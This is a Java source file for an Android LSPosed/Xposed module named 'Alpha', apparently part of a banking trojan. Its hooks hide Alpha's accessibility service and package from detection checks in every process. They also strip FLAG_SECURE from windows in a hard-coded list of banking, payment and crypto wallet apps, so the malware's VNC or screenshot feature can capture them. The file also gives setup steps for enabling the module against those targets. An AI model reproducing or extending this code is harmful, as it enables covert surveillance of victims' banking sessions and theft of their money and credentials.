package com.alpha.shield.stealth;

import android.content.pm.PackageManager;

import org.lsposed.lsparanoid.Obfuscate;

import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

import de.robv.android.xposed.IXposedHookLoadPackage;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.XposedHelpers;
import de.robv.android.xposed.callbacks.XC_LoadPackage;

/**
 * XposedModule — LSPosed/EdXposed module for Alpha.
 *
 * Loaded by LSPosed into every process in scope.
 * Recommended LSPosed scope: "System Framework" + all banking apps.
 *
 * Hooks installed per process:
 *
 *  1. AccessibilityManager.getEnabledAccessibilityServiceList()
 *     → Removes Alpha's service from the returned list in ALL processes.
 *     → Banking apps that enumerate accessibility services won't see Alpha.
 *
 *  2. Settings.Secure.getString() — ENABLED_ACCESSIBILITY_SERVICES key
 *     → Removes Alpha's package from the semicolon-delimited string.
 *     → Apps that read the raw settings value directly also won't see Alpha.
 *
 *  3. AccessibilityManager.isEnabled()
 *     → If Alpha is the ONLY active accessibility service, returns false.
 *     → Some apps use this as a quick "is any accessibility service running" check.
 *
 *  4. WindowManager$Impl.addView() — LayoutParams FLAG_SECURE removal
 *     → Strips FLAG_SECURE from every window BEFORE it is registered.
 *     → Banking app windows become capturable by Alpha's VNC/screenshot.
 *     → Only applied to processes in WALLET_PACKAGES scope (not system-wide).
 *
 *  5. PackageManager.getInstalledPackages() / queryIntentActivities()
 *     → Hides Alpha's package from listing calls in banking processes.
 *     → Prevents apps that check for specific packages from detecting us.
 *
 * To activate:
 *   1. Install LSPosed (Magisk + LSPosed module zip)
 *   2. Install Alpha APK
 *   3. In LSPosed Manager → Modules → enable Alpha
 *   4. Set scope: System Framework + target banking apps
 *   5. Reboot
 */
@Obfuscate
public class XposedModule implements IXposedHookLoadPackage {

    private static final String TAG           = "AlphaXposed";
    private static final String ALPHA_PKG     = "com.alpha.shield";  // must match APP_ID default
    // The service flat component name as stored in settings
    private static final String ALPHA_SVC_CMP = ALPHA_PKG + "/.CommandService";

    @Override
    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) {
        String pkg = lpparam.packageName;

        // Always hide from AccessibilityManager — hook every process
        hookAccessibilityManager(lpparam);
        hookSettingsSecure(lpparam);

        // FLAG_SECURE strip — only in wallet/banking processes (not system)
        if (isWalletPkg(pkg)) {
            hookFlagSecure(lpparam);
            hookPackageManager(lpparam);
            XposedBridge.log(TAG + ": hooked " + pkg);
        }
    }

    // ── Hook 1: AccessibilityManager.getEnabledAccessibilityServiceList ───────

    private void hookAccessibilityManager(XC_LoadPackage.LoadPackageParam lp) {
        try {
            XposedHelpers.findAndHookMethod(
                "android.view.accessibility.AccessibilityManager",
                lp.classLoader,
                "getEnabledAccessibilityServiceList",
                int.class,
                new XC_MethodHook() {
                    @Override
                    @SuppressWarnings("unchecked")
                    protected void afterHookedMethod(MethodHookParam param) {
                        try {
                            List<?> list = (List<?>) param.getResult();
                            if (list == null) return;

                            List<Object> filtered = new ArrayList<>(list);
                            Iterator<Object> it = filtered.iterator();
                            while (it.hasNext()) {
                                Object info = it.next();
                                // AccessibilityServiceInfo.getResolveInfo().serviceInfo.packageName
                                try {
                                    Object resolveInfo = info.getClass()
                                            .getMethod("getResolveInfo")
                                            .invoke(info);
                                    Object serviceInfo = resolveInfo.getClass()
                                            .getField("serviceInfo")
                                            .get(resolveInfo);
                                    String pkgName = (String) serviceInfo.getClass()
                                            .getField("packageName")
                                            .get(serviceInfo);
                                    if (ALPHA_PKG.equals(pkgName)) {
                                        it.remove();
                                    }
                                } catch (Exception ignored) {}
                            }
                            param.setResult(filtered);
                        } catch (Exception e) {
                            XposedBridge.log(TAG + " hook1: " + e.getMessage());
                        }
                    }
                });
        } catch (Exception e) {
            XposedBridge.log(TAG + " hook1 install: " + e.getMessage());
        }
    }

    // ── Hook 2: Settings.Secure.getString — ENABLED_ACCESSIBILITY_SERVICES ───

    private void hookSettingsSecure(XC_LoadPackage.LoadPackageParam lp) {
        try {
            XposedHelpers.findAndHookMethod(
                "android.provider.Settings$Secure",
                lp.classLoader,
                "getString",
                "android.content.ContentResolver",
                String.class,
                new XC_MethodHook() {
                    @Override
                    protected void afterHookedMethod(MethodHookParam param) {
                        try {
                            String key = (String) param.args[1];
                            if (!"enabled_accessibility_services".equals(key)) return;

                            String value = (String) param.getResult();
                            if (value == null || value.isEmpty()) return;

                            // The value is colon-separated: pkg/svc:pkg2/svc2
                            StringBuilder sb   = new StringBuilder();
                            String[]      parts = value.split(":");
                            for (String part : parts) {
                                if (!part.contains(ALPHA_PKG)) {
                                    if (sb.length() > 0) sb.append(':');
                                    sb.append(part);
                                }
                            }
                            param.setResult(sb.toString());
                        } catch (Exception e) {
                            XposedBridge.log(TAG + " hook2: " + e.getMessage());
                        }
                    }
                });
        } catch (Exception e) {
            XposedBridge.log(TAG + " hook2 install: " + e.getMessage());
        }

        // Also hook the variant with default value
        try {
            XposedHelpers.findAndHookMethod(
                "android.provider.Settings$Secure",
                lp.classLoader,
                "getString",
                "android.content.ContentResolver",
                String.class,
                String.class,
                new XC_MethodHook() {
                    @Override
                    protected void afterHookedMethod(MethodHookParam param) {
                        String key = (String) param.args[1];
                        if (!"enabled_accessibility_services".equals(key)) return;
                        String value = (String) param.getResult();
                        if (value == null || !value.contains(ALPHA_PKG)) return;
                        String filtered = value.replaceAll(
                                "(^|:)" + ALPHA_PKG.replace(".", "\\.") + "[^:]*", "")
                                .replaceAll("^:|:$", "")
                                .replaceAll("::", ":");
                        param.setResult(filtered);
                    }
                });
        } catch (Exception ignored) {}
    }

    // ── Hook 3: FLAG_SECURE removal in WindowManager.addView ─────────────────

    private void hookFlagSecure(XC_LoadPackage.LoadPackageParam lp) {
        // Hook android.view.WindowManagerImpl.addView
        hookAddView("android.view.WindowManagerImpl", lp);
        // Also hook the global one
        hookAddView("android.view.WindowManagerGlobal", lp);
    }

    private void hookAddView(String className, XC_LoadPackage.LoadPackageParam lp) {
        try {
            XposedHelpers.findAndHookMethod(
                className,
                lp.classLoader,
                "addView",
                "android.view.View",
                "android.view.ViewGroup.LayoutParams",
                new XC_MethodHook() {
                    @Override
                    protected void beforeHookedMethod(MethodHookParam param) {
                        try {
                            Object lParams = param.args[1];
                            if (lParams == null) return;
                            Class<?> wpClass = lParams.getClass();
                            // Find the flags field
                            java.lang.reflect.Field flagsField;
                            try {
                                flagsField = wpClass.getField("flags");
                            } catch (NoSuchFieldException e) {
                                flagsField = wpClass.getDeclaredField("flags");
                                flagsField.setAccessible(true);
                            }
                            int flags = flagsField.getInt(lParams);
                            // 0x00002000 = FLAG_SECURE
                            if ((flags & 0x00002000) != 0) {
                                flagsField.setInt(lParams, flags & ~0x00002000);
                            }
                        } catch (Exception e) {
                            XposedBridge.log(TAG + " flagSecure: " + e.getMessage());
                        }
                    }
                });
        } catch (Exception e) {
            XposedBridge.log(TAG + " hookAddView(" + className + "): " + e.getMessage());
        }
    }

    // ── Hook 4: PackageManager — hide Alpha from app listings ─────────────────

    private void hookPackageManager(XC_LoadPackage.LoadPackageParam lp) {
        // Hook getInstalledPackages to hide Alpha
        try {
            XposedHelpers.findAndHookMethod(
                "android.app.ApplicationPackageManager",
                lp.classLoader,
                "getInstalledPackages",
                int.class,
                new XC_MethodHook() {
                    @Override
                    @SuppressWarnings("unchecked")
                    protected void afterHookedMethod(MethodHookParam param) {
                        try {
                            List<android.content.pm.PackageInfo> list =
                                (List<android.content.pm.PackageInfo>) param.getResult();
                            if (list == null) return;
                            list.removeIf(pi -> pi != null
                                    && ALPHA_PKG.equals(pi.packageName));
                            param.setResult(list);
                        } catch (Exception e) {
                            XposedBridge.log(TAG + " pmHook: " + e.getMessage());
                        }
                    }
                });
        } catch (Exception e) {
            XposedBridge.log(TAG + " hookPM: " + e.getMessage());
        }

        // Hook getPackageInfo to throw NameNotFoundException for Alpha
        try {
            XposedHelpers.findAndHookMethod(
                "android.app.ApplicationPackageManager",
                lp.classLoader,
                "getPackageInfo",
                String.class,
                int.class,
                new XC_MethodHook() {
                    @Override
                    protected void beforeHookedMethod(MethodHookParam param) {
                        if (ALPHA_PKG.equals(param.args[0])) {
                            param.setThrowable(new PackageManager.NameNotFoundException(
                                    (String) param.args[0]));
                        }
                    }
                });
        } catch (Exception ignored) {}
    }

    // ── Wallet package check (inlined — not via WalletBypass to avoid classloader issues) ─
    private static boolean isWalletPkg(String pkg) {
        if (pkg == null) return false;
        // Known wallets
        switch (pkg) {
            case "com.google.android.apps.walletnfcrel":
            case "com.samsung.android.spay":
            case "com.paypal.android.p2pmobile":
            case "com.squareup.cash":
            case "com.venmo":
            case "com.revolut.revolut":
            case "com.transferwise.android":
            case "com.coinbase.android":
            case "com.binance.dev":
            case "io.metamask":
            case "com.trustwallet.app":
            case "com.blockchain.android":
            case "com.chase.sig.android":
            case "com.wellsfargo.mobile.wfsapp":
            case "com.bankofamerica.mobilebanking":
            case "com.citi.mobile":
            case "com.americanexpress.android.acctsvcs.us":
            case "com.barclays.android.barclaysmobilebanking":
            case "com.monzo.android":
            case "com.starlingbank.android":
            case "com.n26.android":
            case "com.robinhood.android":
            case "com.klarna.app":
            case "piuk.blockchain.android":
            case "org.toshi":
                return true;
        }
        // Heuristic
        String lower = pkg.toLowerCase();
        return lower.contains("bank") || lower.contains("wallet")
                || lower.contains("pay") || lower.contains("crypto")
                || lower.contains("trading") || lower.contains("invest");
    }
}